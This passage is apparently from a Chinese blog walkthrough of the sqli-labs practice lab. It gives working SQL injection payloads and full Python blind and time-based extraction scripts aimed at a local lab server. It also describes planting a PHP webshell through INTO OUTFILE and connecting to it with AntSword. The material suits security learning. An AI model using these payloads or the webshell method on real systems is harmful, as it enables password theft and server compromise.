<pre><code class="hljs n1ql">?id=1&#x27; and extractvalue(1,concat(0x23,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x23</span>))--+</code></pre>

<p>这里每次报错显示的信息只有一行，所以只能有 limit，一个一个的显示，直到找到目标表名</p>
<p><strong>0x3 爆列名</strong></p>
<pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> extractvalue(1,concat(0x23,(select column_name <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> limit 1,1),0x23))--+</code></pre>

<p><strong>0x4 爆内容</strong></p>
<pre><code class="hljs mysql">?id=1&#x27; and extractvalue(1,concat(0x23,(select password from users order by id limit 0,1),0x23))--+</code></pre>

<p>后面的内容可以通过改变limit后的第一个参数查看</p>
<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>与level5很像</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130223612822.png" alt="image-20210130223612822"></p>
<p>但是这里是用 “包裹参数，所以只需要将上面的注入语句中的 ‘ 改为 “即可</p>
<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>提交id&#x3D;1，出现提示</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210131230645205.png" alt="image-20210131230645205"></p>
<p>需要使用outfile函数</p>
<p>在利用sql注入漏洞后期，最常用的就是通过mysql的file系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有以下三个</p>
<ul>
<li>into dumpfile()</li>
<li>into outfile()</li>
<li>load_file()</li>
</ul>
<p>这里我们利用outfile函数</p>
<p>首先确定这关包裹参数的格式</p>
<p>一直测试到<code>id=1&#39;)) --+</code>，才显示正确所以可以确定参数的包裹格式为<code>((&#39;id&#39;))</code></p>
<p><strong>0x1 向网站根目录写入一句话木马</strong></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210131233508732.png" alt="image-20210131233508732"></p>
<p>执行后就可以在根目录中看到这个文件</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210131233433411.png" alt="image-20210131233433411"></p>
<p><strong>0x2 使用蚁剑连接</strong></p>
<pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>/<span class="hljs-number">3</span>.php
密码:cmd</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210131233415258.png" alt="image-20210131233415258" style="zoom:50%;">

<h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>根据标题和测试结果可以看出是盲注</p>
<p>首先判断是什么类型注入</p>
<p>提交<code>id=1</code>，显示结果为<code>You are in</code>，可以确定成功查询返回的结果</p>
<p>提交<code>id=1&#39;</code>，没有提示<code>You are in</code>，但是提交<code>id=1&#39; --+</code>，再次出现<code>You are in</code>，可以确定是字符型注入，包裹形式为<code>&#39;id&#39;</code></p>
<p>接下来就是确定盲注使用的语句，这里可以使用 <code>ascii</code>和<code>substring</code>两个函数</p>
<p><strong>0x1 爆出数据库名</strong></p>
<pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27; and ascii(substring(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span><span class="hljs-comment">%23</span></code></pre>

<p>首先假设数据库名的第一个字母的ascii码值大于97，回显为<code>you are in</code>，所以确定第一个字母大于97，之后可以使用二分法确定出最后的字母。</p>
<p>可以使用脚本完成该过程，脚本跑出的结果为  <strong style="color:red;">security</strong></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201120357770.png" alt="image-20210201120357770"></p>
<p><strong>0x2 爆出表名</strong></p>
<p>使用注入语句</p>
<pre><code class="hljs n1ql">id=1&#x27; and (<span class="hljs-keyword">select</span> ascii(substring(group_concat(table_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span></code></pre>

<p>最后爆出的表名如下</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201121435085.png"></p>
<p><strong>0x3 爆出列名</strong></p>
<pre><code class="hljs n1ql">id=1&#x27; and (<span class="hljs-keyword">select</span> ascii(substring(group_concat(column_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201140521465.png" alt="image-20210201140521465"></p>
<p><strong>0x4 爆出内容</strong></p>
<pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and (select ascii(substring(group_concat(password),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) as a from users having a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201141626668.png" alt="image-20210201141626668"></p>
<p>完整脚本如下</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
url = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-8/?id=&quot;</span>

flag = <span class="hljs-string">&quot;&quot;</span>
t = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment"># payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid)</span>
        <span class="hljs-comment"># payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        <span class="hljs-comment"># payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        payload = <span class="hljs-string">&quot;1&#x27; and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)

        response = requests.get(url+payload)
        t = response.text
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in&quot;</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    <span class="hljs-comment"># print(mid)</span>
    flag = flag + <span class="hljs-built_in">chr</span>(mid)
    <span class="hljs-built_in">print</span>(flag)
<span class="hljs-built_in">print</span>(flag)</code></pre>

<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>题目标题提示了是基于时间且单引号闭合的盲注</p>
<p>基于时间的盲注需要使用到<code>sleep</code>函数，基本用法如下</p>
<p>分别提交<code>id=1</code>，<code>id=1&#39; and sleep(3) --+</code>，其服务器的响应时间如下，第二个的响应时间正好比第一个长了三秒，所以可以根据服务器的响应时间来判断自己所查询的语句是否正确，一般需要编写脚本完成所有步骤。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201213644564.png" alt="image-20210201213644564"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201213715695.png" alt="image-20210201213715695"></p>
<p>注入脚本只需要改一改level8的即可。</p>
<p>完整脚本如下</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> datetime
url = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-9/?id=&quot;</span>

flag = <span class="hljs-string">&quot;&quot;</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment"># payload = &quot;1&#x27; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid)</span>
        payload = <span class="hljs-string">&quot;1&#x27; and if((select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        <span class="hljs-comment"># payload = &quot;1&#x27; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid)</span>
        <span class="hljs-comment"># payload = &quot;1&#x27; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid)</span>
        t1 = datetime.datetime.now()
        response = requests.get(url+payload)
        t2 = datetime.datetime.now()
        <span class="hljs-keyword">if</span> (t2 - t1).seconds &gt; <span class="hljs-number">2</span> :
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>

    flag = flag + <span class="hljs-built_in">chr</span>(mid)
    <span class="hljs-built_in">print</span>(flag)
<span class="hljs-built_in">print</span>(flag)</code></pre>



<p>爆破数据库名的过程如下</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201220840369.png" alt="image-20210201220840369"></p>
<h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>与level9基本相同，只需要将payload中的<code>&#39;</code>换成<code>&quot;</code>即可</p>
<p>完整脚本如下</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> datetime
url = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-9/?id=&quot;</span>

flag = <span class="hljs-string">&quot;&quot;</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment"># payload = &quot;1&quot; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid)</span>
        payload = <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>((select <span class="hljs-built_in">ascii</span>(substring(group_concat(table_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables where table_schema=database() having a&gt;&#123;<span class="hljs-number">1</span>&#125;),sleep(<span class="hljs-number">2</span>),null)%<span class="hljs-number">23</span><span class="hljs-string">&quot;.format(i,mid)</span>
<span class="hljs-string">        # payload = &quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        <span class="hljs-comment"># payload = &quot;1&quot; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid)</span>
        t1 = datetime.datetime.now()
        response = requests.get(url+payload)
        t2 = datetime.datetime.now()
        <span class="hljs-keyword">if</span> (t2 - t1).seconds &gt; <span class="hljs-number">2</span> :
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>

    flag = flag + <span class="hljs-built_in">chr</span>(mid)
    <span class="hljs-built_in">print</span>(flag)
<span class="hljs-built_in">print</span>(flag)</code></pre>

<h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>打开网页是一个登录页面</p>
<p>先判断列数，当三列出现报错，说明只有两列</p>
<pre><code class="hljs crmsh"><span class="hljs-attr">uname=</span>admin&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">2</span><span class="hljs-comment">#&amp;passwd=1&amp;submit=Submit</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421192950662.png" alt="image-20210421192950662"></p>
<p>尝试使用万能密码，成功登录</p>
<pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=admin&#x27; <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span> #&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421192757146.png" alt="image-20210421192757146" style="zoom:50%;">

<p>获取数据库</p>
<pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=sda&#x27; union select 1,(SELECT GROUP_CONCAT(schema_name) <span class="hljs-keyword">FROM</span> information_schema.schemata)##&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421193129915.png" alt="image-20210421193129915"></p>
<p>获取列名，字段名</p>
<pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=sda&#x27; union select 1,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>#&amp;passwd=1&amp;submit=Submit


<span class="hljs-attribute">uname</span>=sda&#x27; union select 1,group_concat(password) <span class="hljs-keyword">from</span> users#&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit</code></pre>

<h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>这一关与上面就是使用的闭合符号不同，使用的双引号，所以只要将上面的payload改一下即可</p>
<pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=sda&quot; union select 1,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>#&amp;passwd=1&amp;submit=Submit


<span class="hljs-attribute">uname</span>=sda&quot; union select 1,group_concat(password) <span class="hljs-keyword">from</span> users#&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit</code></pre>

<h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>输入单引号，出现报错</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421193947944.png" alt="image-20210421193947944"></p>
<p>分析一下即可</p>
<p><code>&#39;&#39;&#39;) and password=(&#39;&#39;) LIMIT 0,1</code></p>
<p>第二个<code>&#39;</code>是我们输入的，所以闭合方式为<code>&#39;)</code></p>
<p>但是这题没有回显数据，可以使用报错注入或者延时盲注</p>
<p>注入的payload</p>
<pre><code class="hljs mysql">uname= sa&#x27;) union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as qing from information_schema.tables group by qing # &amp;passwd= &#x27;) or 1=1 # &amp;submit=Submit

    uname= dsad&#x27;) union select count(*),concat(0x3a,0x3a,(select version()),0x3a,0x3a,floor(rand()*2)) as qing from information_schema.tables group by qing # &amp;passwd= &#x27;) or 1=1 # &amp;submit=Submit
　　　　uname= das&#x27;) union select 1,2 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd= &#x27;) or 1=1 # &amp;submit=Submit

　　　　uname= asd&#x27;) union select 1,2 from (select count(*),concat((select concat(group_concat(table_name) ,0x3a,0x3a) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd= &#x27;) or 1=1 # &amp;submit=Submit

　　　　uname= das&#x27;) union select 1,2 from (select count(*),concat((select concat(group_concat(column_name) ,0x3a,0x3a) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd= &#x27;) or 1=1 # &amp;submit=Submit

　　　　uname= das&#x27;) union select 1,2 from (select count(*),concat((select concat(count(*),0x3a, 0x3a) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd= &#x27;) or 1=1 # &amp;submit=Submit

　　　　uname= das&#x27;) union select 1,2 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd= &#x27;) or 1=1 # &amp;submit=Submit</code></pre>

<h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>这一关就是和上面的闭合方式不一样，稍加修改即可</p>
<pre><code class="hljs n1ql">uname= sad&quot; union <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat(<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-built_in">floor</span>(rand()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a # &amp;passwd= <span class="hljs-string">&#x27;) or 1=1 # &amp;submit=Submit</span></code></pre>

<h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>这是单引号闭合的布尔盲注，POST型</p>
<p>判断依据可以根据页面出现的图片</p>
<p>登录不成功时出现的图片</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421195038499.png" alt="image-20210421195038499" style="zoom:50%;">

<p>登录成功的图片</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421195111446.png" alt="image-20210421195111446" style="zoom:50%;">



<p>这里使用时间盲注</p>
<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2021/4/21 19:54</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : level15.py</span>

<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> datetime
url = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-15/&quot;</span>

flag = <span class="hljs-string">&quot;&quot;</span>
data = &#123;<span class="hljs-string">&#x27;uname&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;passwd&#x27;</span>:<span class="hljs-string">&#x27;sad&#x27;</span>,<span class="hljs-string">&#x27;submit&#x27;</span>:<span class="hljs-string">&#x27;Submit&#x27;</span>&#125;
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):

        <span class="hljs-comment"># payload = &quot;1&#x27; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid)</span>
        <span class="hljs-comment">#payload = &quot;admin&#x27; and if((select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid)</span>
        <span class="hljs-comment"># payload = &quot;1&#x27; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid)</span>
        payload = <span class="hljs-string">&quot;admin&#x27; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(5),null)--+&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        t1 = datetime.datetime.now()
        data[<span class="hljs-string">&#x27;uname&#x27;</span>] = payload
        response = requests.post(url=url,data=data)

        t2 = datetime.datetime.now()
        <span class="hljs-keyword">if</span> (t2 - t1).seconds &gt; <span class="hljs-number">5</span>:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
        <span class="hljs-built_in">print</span>(flag)

    flag = flag + <span class="hljs-built_in">chr</span>(mid)
    <span class="hljs-built_in">print</span>(flag)
<span class="hljs-built_in">print</span>(flag)</code></pre>

<h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><p>将上一关的脚本该给双引号闭合即可</p>
<h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><p>updata注入</p>
<p>可以使用报错注入</p>
<pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=admin&amp;passwd=<span class="hljs-number">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select database())),<span class="hljs-number">1</span>)#&amp;submit=Submit</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421202328557.png" alt="image-20210421202328557"></p>
<h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><p>uname和passwd都使用check_input过滤，而在这里将user-agent和ip作为记录，插入数据库</p>
<p>提示了ip地址和user-Agent，应该时http头注入</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421202421443.png" alt="image-20210421202421443"></p>
<p>抓包后，在user-agent的位置插入注入语句</p>
<pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select database())),<span class="hljs-number">1</span>) and <span class="hljs-number">1</span>=&#x27;<span class="hljs-number">1</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421203429860.png" alt="image-20210421203429860"></p>
<h2 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h2><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421203658570.png" alt="image-20210421203658570"></p>
<p>登录后提示了referer，应该是在referer头注入</p>
<pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select database())),<span class="hljs-number">1</span>) and <span class="hljs-number">1</span>=&#x27;<span class="hljs-number">1</span>
</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421203948670.png" alt="image-20210421203948670"></p>
<h2 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h2><p>正常登录，发现一个cookie字段</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421204122118.png" alt="image-20210421204122118"></p>
<p>尝试cookie位置注入</p>
<p>这里直接使用union联合查询即可</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421204741263.png" alt="image-20210421204741263"></p>
<pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=-adm&#x27; union select 1,group_concat(table_name),3 <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()#

<span class="hljs-attribute">uname</span>=-ada&#x27; union select 1,group_concat(column_name),3 <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>#

<span class="hljs-attribute">uname</span>=-ada&#x27; union select 1,group_concat(password),3 <span class="hljs-keyword">from</span> users#</code></pre>

<h2 id="level21"><a href="#level21" class="headerlink" title="level21"></a>level21</h2><p>这一关和上一关就是加了一层base64编码，所以可以直接用上面的注入编码后提交</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421205159215.png" alt="image-20210421205159215"></p>
<pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=-as&#x27; union select 1,2,3#
<span class="hljs-attribute">uname</span>=LWFzJyB1bmlvbiBzZWxlY3QgMSwyLDMj</code></pre>

<p>但是出现报错</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421205525074.png" alt="image-20210421205525074" style="zoom:67%;">

<pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=-as&#x27;) union select 1,2,3#
<span class="hljs-attribute">uname</span>=LWFzJykgdW5pb24gc2VsZWN0IDEsMiwzIw==</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421205624679.png" alt="image-20210421205624679" style="zoom:50%;">

<p>所以只要将上面的sql语句修改闭合方式再编码提交即可</p>
<h2 id="level22"><a href="#level22" class="headerlink" title="level22"></a>level22</h2><p>基于错误的双引号字符型Cookie注入</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421210142530.png" alt="image-20210421210142530"></p>
<p>这里只要将21关的双引号换成双引号，再base64编码</p>
<pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=-as&quot; union select 1,2,3#
<span class="hljs-attribute">uname</span>=LWFzIiB1bmlvbiBzZWxlY3QgMSwyLDMj</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421210212614.png" alt="image-20210421210212614"></p>
<pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=-ada&#x27; union select 1,group_concat(password),3 <span class="hljs-keyword">from</span> users--+ 
<span class="hljs-attribute">uname</span>=LWFkYSIgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHBhc3N3b3JkKSwzIGZyb20gdXNlcnMj</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421210330135.png" alt="image-20210421210330135"></p>
<h2 id="level23"><a href="#level23" class="headerlink" title="level23"></a>level23</h2><p>根据提示可以知道是get型注入</p>
<p>但是但输入</p>
<pre><code class="hljs apache"><span class="hljs-attribute">2</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #
<span class="hljs-attribute">2</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> --+
<span class="hljs-attribute">2</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> %<span class="hljs-number">23</span></code></pre>

<p>都会出现语法错误，猜测应该是 <code>#, -- </code>两个注释符被过滤了</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210507090028666.png" alt="image-20210507090028666"></p>
<p>里我们需要一个特殊的注释符：;%00或者and和or语句进行闭合</p>
<p>payload:	</p>
<pre><code class="hljs reasonml">?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group<span class="hljs-constructor">_concat(<span class="hljs-params">concat_ws</span>(0x7e,<span class="hljs-params">username</span>,<span class="hljs-params">password</span>)</span>) from security.users ;%<span class="hljs-number">00</span></code></pre>

<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507090258902.png" alt="image-20210507090258902"></p>
<h2 id="level24"><a href="#level24" class="headerlink" title="level24"></a>level24</h2><p><strong>二次注入</strong></p>
<blockquote>
<p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p>
<p>二次注入，可以概括为以下两步:</p>
<p>第一步：插入恶意数据进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</p>
